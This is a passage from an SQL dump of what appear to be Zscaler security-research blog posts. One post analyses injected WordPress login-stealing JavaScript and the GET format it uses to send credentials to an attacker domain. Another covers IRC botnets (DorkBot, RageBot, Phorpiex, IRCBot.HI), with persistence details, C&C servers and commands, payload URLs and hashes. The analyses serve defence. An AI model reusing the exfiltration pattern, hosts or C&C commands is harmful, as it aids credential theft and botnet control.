Mannon', 'Advertising;Analysis;Evasion/Stealth;Exploit;Exploit Kit;Ransomware', 'https://www.zscaler.com/blogs/research/magnitude-exploit-kit-leading-ransomware-malvertising');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (145, 'Compromised WordPress Sites Leaking Credentials', 'Sameer Patil', 'May 07, 2015', 'Zscaler recently observed a credentials leak campaign on multiple WordPress sites. The compromised sites run backdoor code, which activates when the user submits login credentials. The credentials are encoded and sent to an attacker website in the form of a GET request. Till now, we have identified only one domain \"conyouse.com\" which is collecting all the credentials from these compromised sites.\r\n\r\nThe following is a sample list of WordPress websites compromised through this campaign:\r\n\r\n	 shoneekapoor.com\r\n	 dwaynefrancis.com\r\n	 blissfields.co.uk\r\n	 avalineholding.com\r\n	 attherighttime.net\r\n	 bolsaemprego.ne\r\n	 capitaltrill.com\r\n	 blowdrybar.es\r\n	 espada.co.uk\r\n	 technograte.com\r\n	 socalhistory.org\r\n	 blissfields.co.uk\r\n	 glasgowcontemporarychoir.com\r\n	 sombornefp.co.uk\r\n	 reciclaconloscincosentidos.com\r\n	 testrmb.com\r\n	 digivelum.com\r\n	 laflordelys.com\r\n\r\n\r\nCredential Leakage\r\n\r\nWhen unsuspecting users attempt to login to one of the compromised WordPress sites, they are served injected JavaScript code as part of the login page. Below, we walk through the full exploit cycle illustrating how the user credentials are being stolen through this campaign.\r\n \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Compromised WordPress login page\r\n		\r\n	\r\n\r\n\r\nAs part of the WordPress login page, the user is getting served malicious information stealing JavaScript code hosted on “conyouse[.]com”. The obfuscated JavaScript code present in “wp.js” file can be seen here:\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Information stealing JavaScript code\r\n		\r\n	\r\n\r\n\r\nThe variable “_0xdd75” stores a list of strings which are used dynamically in the JavaScript above.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			List of encoded strings\r\n		\r\n	\r\n\r\nThis code is triggered when the user submits their credentials on the login page of the WordPress site.\r\nThe form containing the username and password input box has a fixed name as “loginform” in all WordPress sites. The preventDefault event method is used to cancel the submit event for “loginform” entity and execute the alternate code which is present in this file. The login credential string is serialised and encoded in a Base64 format.\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Information Stealing JavaScript code\r\n		\r\n	\r\n\r\n\r\nThe final data is sent to \"conyouse[.]com/scr.js\", which is statically stored as one of the strings. The final GET request generated is as shown in the traffic:\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			GET Request relaying stolen credentials\r\n		\r\n	\r\n\r\n\r\nOn decoding the encoded string highlighted above we see that it’s relaying the stolen user credentials using the GET request. The format of this GET request is\r\n \r\n\"www.conyouse[.]com/scr.js?callback=jQuery<random number>&data=<BASE64_ENCODED_CREDENTIALS>&_=<random number>\"\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Base64 decoded data string\r\n		\r\n	\r\n\r\n\r\nThe complete sequence of action captured is shown in below screenshot.\r\n\r\n	\r\n		\r\n			\r\n			\r\n		\r\n		\r\n			Complete exploit cycle\r\n		\r\n	\r\n\r\nThe end user is oblivious to the fact that the credentials were leaked to a remote attacker\'s site as he is redirected to a successful logged in session of WordPress site.\r\n\r\nConclusion\r\nWordPress, being one of the most popular Content Management Systems & Blogging platform, remains an attractive target for cybercriminals due to it\'s large user base. While the initial vector behind the compromise of the sites listed in this blog is unclear, it is extremely important for the site administrators to keep their WordPress sites patched with latest security updates.\r\n\r\nAnalysis by - Sameer Patil & Deepen Desai', 'Compromise;Data Breach;Malware', 'https://www.zscaler.com/blogs/research/compromised-wordpress-sites-leaking-credentials');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (146, 'IRC Botnets Alive, Effective & Evolving', 'Nirmal Singh', 'April 23, 2015', 'Introduction\r\nAn IRC Botnet is a collection of machines infected with malware that can be controlled remotely via an IRC channel. It usually involves a Botnet operator controlling the IRC bots through a previously configured IRC server & channel. The Botnet operator, after appropriate checks, periodically moves the IRC bot to a new IRC channel to thwart researchers & automated sandboxes from monitoring the commands.\r\n\r\n \r\n\r\nIn this blog, we will look at one of the most prevalent IRC based malware families - DorkBot, followed by three additional IRC Botnet families - RageBot, Phorpiex, and IRCBot.HI.\r\n\r\n \r\nDorkBot Installer\r\nIn our telemetry data from last 3 months we have seen following URL serving the DorkBot installer:\r\n\r\n\r\n\r\napi1[.]wipmania[.]com[.]wipmsc[.]ru/api1[.]gif  (Check APPENDIX section for additional info.)\r\n\r\n\r\n\r\nThe malware executable checks for two command line arguments\r\n\r\n	\"-aav_start\"  - It terminates\r\n	\"–shell\"  - It starts the infection cycle, creates a registry key \"Windows Update\" to ensure persistence, and creates a mutex named “Windows_Shared_Mutex_231_c000900” to ensure only one copy of Dorkbot is running\r\n\r\n\r\n\r\n\r\n\r\n\r\nIf no command line argument is provided, it starts injecting threads into other processes without performing the above mentioned actions. \r\n\r\n \r\n\r\nIt first injects a thread into svchost.exe and performs the following actions:\r\n\r\n\r\n\r\n\r\n\r\n\r\n	Copy itself as \"%APPDATA% \\Update\\Explorer.exe\" on the infected system.\r\n	Creates a Run registry key with the name of \"Windows Explorer Manager\" for the dropped executable copy.\r\n	It creates a thread that monitors the Run key created in step 2 & recreates it if missing, every 10,000 seconds.\r\n	It also creates a thread that copies the file created in step 1 to file name “\\c731200” in the \"%APPDATA%” folder.\r\n	It then creates a remote thread in mspaint.exe that tries to resolve a predetermined list of domains as shown in image below:\r\n\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			DorkBot - Hardcoded Domains\r\n		\r\n	\r\n\r\n\r\n\r\nThe main Dorkbot binary (MD5-E7E48AD1A2A57CC94B56965AA8B476DA) was found embedded in the resource section which is extracted and executed at runtime.\r\n\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			DorkBot - memory strings\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n\r\nIt also creates a remote thread in the “calc.exe” process that performs the following actions:\r\n\r\n\r\n\r\n	Creates a mutex with the name “c731200”\r\n	Checks for Internet connectivity using API InternetCheckConnection with www.google.com as the URL.\r\n	It then tries to download files from 20 different URLs and saves the downloaded file with random file names in the %Temp% folder. File names are shown in the screenshot below:\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			DorkBot- Random file names\r\n		\r\n	\r\n\r\n\r\n\r\nAll the URLs are hardcoded in the DorkBot and are encrypted via a custom encryption method.\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			DorkBot - Encrypted URLs\r\n		\r\n	\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			DorkBot - Pseudocode of decryption function\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\nBelow is the full list of URLs from from where it tries to download additional malware:\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			URL\r\n		\r\n		\r\n			http://api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			http://api2[.]wipmania[.]com[.]wipmsc[.]ru/api2.gif\r\n		\r\n		\r\n			http://api3[.]wipmania[.]com[.]wipmsc[.]ru/api3.gif\r\n		\r\n		\r\n			http://api4[.]wipmania[.]com[.]wipmsc[.]ru/api4.gif\r\n		\r\n		\r\n			http://api5[.]wipmania[.]com[.]wipmsc[.]ru/api5.gif\r\n		\r\n		\r\n			http://api6[.]wipmania[.]com[.]wipmsc[.]ru/api6.gif\r\n		\r\n		\r\n			http://api7[.]wipmania[.]com[.]wipmsc[.]ru/api7.gif\r\n		\r\n		\r\n			http://api8[.]wipmania[.]com[.]wipmsc[.]ru/api8.gif\r\n		\r\n		\r\n			http://api9[.]wipmania[.]com[.]wipmsc[.]ru/api9.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]fowd[.]ru/api.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]selfmg[.]ru/api.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]lotus5[.]ru/api.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]wipmania[.]ru/lkwaxd.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]lotys[.]ru/vjojai.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]bwats[.]ru/ofjtme.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]stcus[.]ru/apsphv.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]cmoen[.]ru/zkmchm.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]artbcon3[.]ru/frflec.gif\r\n		\r\n		\r\n			http://api[.]wipmania[.]com[.]yeloto[.]ru/zwfmwd.gif\r\n		\r\n		\r\n			http://update[.]wipmania[.]com[.]raulhost[.]ru/logo.gif\r\n		\r\n	\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\nDorkBot\r\n\r\nDorkbot represents a family of information stealing worms that uses IRC based Command & Control (C&C) server communication. Dorkbot is also known as ngrBot due to it\'s similar feature set. It is one of the most powerful IRC based botnets that generates revenue for the botnet operator via the following features:\r\n\r\n \r\n\r\n\r\n	Capable of spreading via chat messengers, USB drives, & social networking sites\r\n	Supports multiple Distributed Denial of Service (DDoS) attack types\r\n	Capable of stealing login credentials for multiple HTTP and FTP sites\r\n	Blocks security update related websites to evade detection\r\n	Capable of downloading, installing and uninstalling other malware payloads\r\n\r\n\r\nRageBot, Phorpiex, and IRCBot.HI Analysis –\r\n\r\n\r\n\r\nFrom our 3 months telemetry data, we have seen the following URLs serving these IRC bots–\r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n			\r\n			URL\r\n			\r\n			\r\n			\r\n			\r\n			MD5\r\n			\r\n			\r\n			\r\n			Malware Name\r\n			\r\n		\r\n		\r\n			\r\n			Ernsthaft[.]su/ert[.]exe\r\n			\r\n			\r\n			6C738D0A737D16C87EB40C24C5F594A6\r\n			\r\n			\r\n			IRCBot.HI\r\n			\r\n		\r\n		\r\n			\r\n			Mslighton[.]net/uploads/io[.]exe\r\n			\r\n			\r\n			C73DBA5827728EEAC59951B14AB329F4\r\n			\r\n			\r\n			RageBot\r\n			\r\n		\r\n		\r\n			\r\n			Colorfashionbox[.]com/u[.]exe\r\n			\r\n			\r\n			F919C902AC07AF339BBD753E6EFF89C7\r\n			\r\n			\r\n			Phorpiex\r\n			\r\n		\r\n		\r\n			\r\n			Dumanfun[.]com/t[.]exe\r\n			\r\n			\r\n			DBC477DF90D4ECB37B698C571DE90D11\r\n			\r\n			\r\n			Phorpiex\r\n			\r\n		\r\n	\r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\nIn addition to IRC based C&C communication, all these bots have following similarity in their operation:\r\n\r\n\r\n \r\n\r\n1. Checks execution environment - Virtual Environment, Honeypot or Sandbox\r\n\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			RageBot - Check via Username\r\n		\r\n	\r\n\r\nAs seen in the screenshot above, Ragebot is checking for common usernames found in certain public sandboxing environments before executing further.\r\n\r\n \r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phorpiex - Check via DLL name\r\n		\r\n	\r\n\r\nPhorpiex bot looks for strings like \'qemu\', \'virtual\', and \'vmware\' in system registry to check for execution in Virtual Environment. In addition, it also checks for the presence of Sandboxie sandbox environment by looking for specific DLLs as seen in the screenshot above.\r\n\r\n \r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			IRCBot.HI - Check via DLL & Product IDs\r\n		\r\n	\r\n\r\n\r\n\r\nIt is important to note that IRCBot.HI checks the ProductID value from the registry against multiple hardcoded ProductID values. It terminates execution if any of them matches. We believe that these hardcoded ProductIDs were harvested from various online public sandboxes.\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n2. Creates Mutex\r\n\r\n\r\n\r\n\r\n             \r\n\r\nRageBot – It creates a mutex with name “ie”\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			RageBot - Mutex\r\n		\r\n	\r\n\r\n\r\n\r\n           Phorpiex – It creates a mutex with name “t2”, We have also seen some Phorpiex samples which were creating mutexes with name “t3” and “t4”. \r\n\r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phorpiex - Mutex\r\n		\r\n	\r\n\r\n\r\n\r\n          IRCBot.HI – During installation it creates a mutex with the name MAIN_<RandomNumber>. When it runs from the installation path, it creates a mutex with the name BACKUP_<RandomNumber> \r\n\r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			IRCBot.HI - Mutex\r\n		\r\n	\r\n\r\n\r\n\r\n3. Installation\r\n\r\n\r\n\r\n \r\n\r\n\r\nRageBot- It installs itself in “%ProgramFiles%\\Common Files\\System” or “C:\\DOCUME~1\\” directory. The malware uses ragebot.exe as file name for the dropped file.\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			RageBot – Building installation path\r\n		\r\n	\r\n\r\n\r\nIf it is not able to create the file at the above mentioned locations then it tries to install itself in “C:\\RECYCLER” directory.\r\n\r\n \r\n\r\nPhorpiex – It installs itself into %WINDIR% , %USERPROFILE% , %APPDATA% and %TEMP% locations by creating a folder “M-50504578520758924620” containing a file named winmgr.exe.\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phorpiex – Pseudocode of Installations function \r\n		\r\n	\r\n\r\n\r\nIt then deletes itself after installation by running a batch file dropped in the %TEMP% folder.\r\n\r\n \r\n\r\nIRCBot.HI – During our analysis it installed itself into %WINDIR% and %USERPROFILE%. In %WINDIR%, it creates a folder named 1756410959 and drops copy of itself as lsass.exe. In %USERPROFILE%, it drops copy of itself as ctfmon.exe. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			IRCBot.HI – Installing in different locations\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n4. Adding autostart feature using Run registry key.\r\n\r\n\r\n \r\n\r\nRageBot – Creates Run Key -         HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and key name as – “Windows Update”\r\n\r\n \r\n\r\nPhorpiex – Creates Run Key - HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and key name as – “Microsoft Windows Manager”\r\n\r\n \r\n\r\nIRCBot.HI – Creates Run Once Key - HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce and key name as – “*<RandomNumber>”\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			IRCBot.Hi – RunOnce Entry\r\n		\r\n	\r\n\r\n\r\n\r\n5. Adding itself to Windows Firewall trusted application list \r\n\r\nAll these bots add themselves to the Windows Firewall’s exception list by modifying the key\r\n\"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\"\r\n\r\n\r\n\r\n\r\n6. Propagation method \r\n \r\n\r\nRageBot – \r\n\r\n\r\n\r\n	It copies itself to the following P2P & Instant messenger application folders for spreading  \r\n	\r\n		\\Program Files\\LimeWire\\Shared\r\n		\\Program Files\\eDonkey2000\\incoming\r\n		\\Program Files\\KAZAA\r\n		\\Program Files\\Morpheus\\My Shared Folder\\\r\n		\\Program Files\\BearShare\\Shared\\\r\n		\\Program Files\\ICQ\\Shared Files\\\r\n		\\Program Files\\Grokster\\My Grokster\\\r\n		\\My Downloads\\\r\n	\r\n	\r\n	It also searches for RAR files and copies itself inside them.\r\n\r\n\r\n\r\n\r\nPhorpiex –\r\n\r\n    A. Creates a shortcut in a removable device\r\n\r\n	It checks for all removable devices\r\n	Copies itself with a different name\r\n	Creates a shortcut to an already present folder and sets the path of a shortcut to run the malicious file\r\n	Hides the malicious file and folder by setting a hidden attribute for both\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phorpiex - Creating Shortcuts\r\n		\r\n	\r\n\r\n\r\n    B. Creates an autorun.inf file in removable devices to autorun the malicious file\r\n\r\n\r\n	Checks for all removable devices.\r\n	Copies itself with a name of windrv.exe\r\n	Creates an autorun.inf file to autorun the malicious file\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phorpiex - Creating autorun.inf file\r\n		\r\n	\r\n\r\n\r\nIRCBot.HI - \r\n\r\nWe identified strings related to Skype in memory during our analysis that would suggest this bot is capable of spreading via Skype. \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			IRCBot.HI - Skype inject related string\r\n		\r\n	\r\n\r\n\r\n7. IRC based Command & Control communication\r\n\r\n\r\nAll these bots use the IRC protocol for C&C communication. Bots perform different actions based on the commands received from the remote C&C server.\r\n\r\n \r\n\r\nRageBot – During our analysis, this RageBot sample was trying to connect to vnc.e-qacs[.]com on port 6668. Upon successful connection, the following initial communication was observed:\r\n\r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			RageBot - C&C Communication\r\n		\r\n	\r\n\r\n\r\n\r\n\r\nYou can find full list of C&C commands in the appendix section.\r\n\r\n\r\n	\r\n		\r\n			 \r\n		\r\n	\r\n\r\n\r\nPhorpiex – It tries to connect to trksrv[.]su on port 5050. Some other IRC servers it tries to connect to are - trik[.]su , srv50[.]ru and trkbox[.]ru. Upon successful connection, it sends the following IRC commands:\r\n\r\n\r\n                                    \r\n\r\n                                      NICK `|USA|hihdlxu\r\n\r\n                                      USER x \"\" \"x\" :x\r\n\r\n \r\n\r\nSome other commands:\r\n \r\n\r\n                              001 -> Sends JOIN #b message to server\r\n\r\n                              PING -> Checks status\r\n\r\n                              .j <channel name> - > Join given channel\r\n\r\n                              bye -> Uninstall bot\r\n\r\n\r\n \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Phorpiex - C&C Communication\r\n		\r\n	\r\n\r\n\r\n\r\nIRCBot.HI - It tries to connect to irc[.]ernsthaft[.]su or irc[.]ded-rrwqwzjzjris[.]com on port 6667. \r\n\r\nUpon successful connection, it sends the following IRC commands:\r\n \r\n\r\n                                     PASS ddos\r\n\r\n                                     USER <8 char string> <1 digit number> * :<8 char string>\r\n\r\n                                     NICK n[USA|A|D|<OS_NAME><OS_TYPE>|1c]<8 char string>\r\n\r\n                                     JOIN #PlanB\r\n\r\n\r\nBelow is a sample of the C&C communication for this bot:\r\n\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			IRCBot.HI - C&C Communication\r\n		\r\n	\r\n\r\n\r\nConclusion\r\nIn this era of sophisticated Botnets with multiple C&C communication channels, custom protocols, and encrypted communication; we continue to see a steady number of new IRC based Botnet payloads being pushed out in the wild on a regular basis. As we saw in our analysis, IRC based Botnet families continue to evolve in terms of sophisticated features incorporated in the bots.\r\n\r\nThreatLabZ is actively monitoring this threat and ensuring signature coverage for Zscaler customers.\r\n\r\nAppendix\r\n\r\nDorkBot installer URLs and MD5\r\n\r\n \r\n\r\n	\r\n		\r\n			TIME\r\n			MD5\r\n			URL\r\n		\r\n		\r\n			Jan-15\r\n			E49B3EF80FF4DB4DB1D5220930EC7DAD\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			CC9D72663D2495779B0C81AEE34592E7\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			A98472BCAA010433A80410C3483C90E1\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			EEFC72EFFD96FFD11EC2D69CD6248AC5\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			4E7149C1401F5A0BC34E3AAD6070F4BE\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			5B14C029570F40BDDC73669FE4EFEFB0\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			4C54D366B04F9980F038CB6FC62603D0\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			6E4282023D6A19B27C30DB5D54CEE32C\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			E7B61B2BE23167965079468DF36497EF\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			DC8CBA3F91A34F0D1EFA79BE4495B305\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			8AAD291926335F28B4402830252556F7\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			8036A36C372602CFA049996B9F5BD6AE\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			8036A36C372602CFA049996B9F5BD6AE\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			7257FD6F90B5AA9BB249EA74B764A401\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			B186525826856E881E879C6C44BB2452\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			220188F1BD2E10BA0751383EA0946DBA\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			2DB9BD0ABD99F3285721D358A6816737\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			EBEB072B8336F5FD35328227A60B271C\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			01303BEFE5938C3C748C4E058A8A6AE9\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			82E2CA09BDEB3ABF8B70D848F66793E7\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			0B2E7AE8DF2ADA1E86A3A25FC248C6FE\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			430560EBD3BE6A680BFA6409F332585B\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			F79AF05D9B43F99EB6FC64DA2C129F67\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			384252746FAFF8D264E6A8CA450B6301\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			C9636239ED698834CABA78E1F9F8DB0F\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			9C42746376CC7D265D6BF554B960EDE2\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			67B08BF0F2C89DE4E0D1C36BAF7193B9\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			735B6602B4BD1D71246F43642D6873AA\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			7D9AF61AE962443D586BFC8A86100B5F\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			05ABC48A4BEE624D7952954CF14F699D\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			FF638ACA7D8D10ED8AD2DE1BC333123D\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			AA4085182E8F10FEC8EBC3F6D3612321\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			1A54593E7C82DD1B16B7626FCB211DA1\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Jan-15\r\n			235E67A88907DA68BFBB9264A00A31E3\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			2CBD9428DEE885C30258BF0C38299138\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			CCDC5EC2085536160813658BE549F0B6\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			CBD732F87901EE03820DBA41D0D2895A\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			BE5E43F2786D628B7AA8689C2108247D\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			5AEC4A3B3E0AEB3B13B98086FC81D797\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			6034814DB1C25A092C39F251F29B2216\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			6CAE0B51E5EAD86EEA47C4068287650A\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			451E324D3CB601E00FA041D6FDE1C4EC\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			9AEB3A097F11887D89EC08D337814B6B\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			8F9F97232DBE283BC5E7B6AB4DD580B8\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			F57A08679380F3FDFD369528FE5CE854\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			F24BC22CFD12E3FDE40D06BF54F35CF1\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			4BB4C19B5FC2401D45845789CC761577\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			583432D95424EC051AFE9E621DC41ACA\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			C5756AC3FE61266D326B43E904BC1A6C\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			44012367D7FFA7845B59462952AB9014\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			FC506F023FF71E3ACDEE4449C43E5F1B\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			322E11B552B897ADBC9ABCE51774988E\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			EC0832E5818E4CD753C4B2675C6179A1\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			63C37B2FEB0C0F71568B9771AC4DACE4\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Feb-15\r\n			7BE4749D1D1F8950F7288C67A393B7F0\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			ADDF9E2B207AD9E89DB46E81A8121882\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			3E70DB4E5F5F60F2FDE7AEC38F4B30CD\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			268301147BC53722A898E1F38E6F026D\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			309FB15C08861BC063C19C326A29AC98\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			422C1A2BC53F72CAE5435F7F5598BDFD\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			Mar-15\r\n			30A6C9DC574075C5EA47F17EA9392C47\r\n			api1[.]wipmania[.]com[.]wipmsc[.]ru/api1.gif\r\n		\r\n		\r\n			